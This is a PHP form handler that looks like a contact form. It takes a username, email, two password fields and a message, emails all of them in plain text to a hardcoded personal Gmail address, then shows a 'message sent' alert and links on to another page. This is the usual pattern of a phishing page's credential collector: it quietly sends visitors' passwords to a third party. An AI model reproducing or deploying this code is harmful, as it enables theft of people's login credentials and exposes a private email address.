
<?php
$name = htmlspecialchars($_POST['uname1']);
$email = htmlspecialchars($_POST['email']);
$password1 = htmlspecialchars($_POST['upswd1']);
$password2 = htmlspecialchars($_POST['upswd2']);
$message = htmlspecialchars($_POST['message']);

if (!empty($email) && !empty($message)) {
  if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    $receiver = "ankita.s.reddy1@gmail.com"; //enter that email address where you want to receive all messages
    $subject = "From: $name <$email>";
    $body = "Name: $name\nEmail: $email\nPassword1: $password1\npassword2: $password2\n\nMessage:\n$message\n\nRegards,\n$name";
    $sender = "From: $email";
    if (mail($receiver, $subject, $body, $sender)) {
      echo '<script type="text/javascript"> alert("your message has been sent")</script>';
      echo '<a href=index4.html>click here to continue to page</a>';
    } else {
      echo '<script type="text/javascript"> alert("sorry, failed to send your message")</script>';
    }
  } else {
    echo '<script type="text/javascript"> alert("Enter a valid email address")</script>';
  }
} else {
  echo '<script type="text/javascript"> alert("Email and message field is required")</script>';
}
?>